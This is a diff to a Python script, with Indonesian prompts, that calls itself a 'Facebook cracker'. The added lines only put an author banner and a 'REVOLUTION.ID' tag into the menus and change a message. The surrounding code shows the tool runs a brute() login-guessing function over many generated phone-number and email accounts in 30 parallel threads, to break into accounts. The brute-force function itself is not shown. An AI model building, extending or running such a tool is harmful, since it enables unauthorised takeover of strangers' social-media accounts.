@@ -32,6 +32,7 @@ def random_numbers():
   os.system('cls' if os.name == 'nt' else 'clear')
   print('''
   ♠️♦️👿FACEBOOK CRACKER RANDOM NUMBERS👿♦️♠️
+         👉❤RIZKY MAULANA SIDIK❤👈
 
   Isi Nomer Awal Nya Dulu Bro
   Harus 5 digit gak boleh kurang dan gak boleh lebih.
@@ -85,12 +86,14 @@ def random_email():
   ''')
   with concurrent.futures.ThreadPoolExecutor(max_workers=30) as th:
     {th.submit(brute, user['user'], user['pw']): user for user in data}
-  print('\n  Sudah selesai kak')
+  print('\n  Sudah Selesai Bro🙏🏽🙏🏽')
 
 def pilih():
   print('''
+👉♥️ RIZKY MAULANA SIDIK ❤👈
 ♣️❤👉 1. Crack Dari Nomer Random 👈♥️♣️
 👿♣️👉  2. Crack Dari Email Random 👈♣️👿
+👉☠ R E V O L U T I O N . I D ☠👈
   ''')
   pil=int(input('  Pilih Yang Mana Bro?: '))
   if pil == 1:
